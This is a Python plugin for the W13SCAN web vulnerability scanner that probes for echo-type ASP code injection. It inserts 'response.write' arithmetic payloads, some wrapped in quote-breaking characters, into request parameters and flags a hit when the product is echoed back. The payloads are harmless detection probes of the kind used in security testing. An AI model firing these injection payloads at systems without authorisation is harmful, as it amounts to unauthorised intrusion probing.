#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/4 5:11 PM
# @Author  : w8ay
# @File    : command_asp_code.py
import random

from api import PluginBase, WEB_PLATFORM, conf, ResultObject, VulType, generateResponse


class W13SCAN(PluginBase):
    name = 'ASP代码注入'
    desc = '''暂只支持回显型的ASP代码注入,当level>4时会无视环境识别因素进行fuzz'''


    def audit(self):
        if WEB_PLATFORM.ASP not in self.response.programing and conf.level < 2:
            return

        randint1 = random.randint(10000, 90000)
        randint2 = random.randint(10000, 90000)
        randint3 = randint1 * randint2

        _payloads = [
            'response.write({}*{})'.format(randint1, randint2),
            '\'+response.write({}*{})+\''.format(randint1, randint2),
            '"response.write({}*{})+"'.format(randint1, randint2),
        ]

        # 载入处理位置以及原始payload
        iterdatas = self.generateItemdatas()

        # 根据原始payload和位置组合新的payload
        for origin_dict, positon in iterdatas:
            payloads = self.paramsCombination(origin_dict, positon, _payloads)
            for key, value, new_value, payload in payloads:
                r = self.req(positon, payload)
                if not r:
                    continue
                html = r.text
                if str(randint3) in html:
                    result = ResultObject(self)
                    result.init_info(self.requests.url, "发现asp代码注入", VulType.CMD_INNJECTION)
                    result.add_detail("payload探测", r.reqinfo, generateResponse(r),
                                      "探测payload:{},并发现回显数字{}".format(new_value, randint3), key, payload, positon)
                    self.success(result)
                    return True
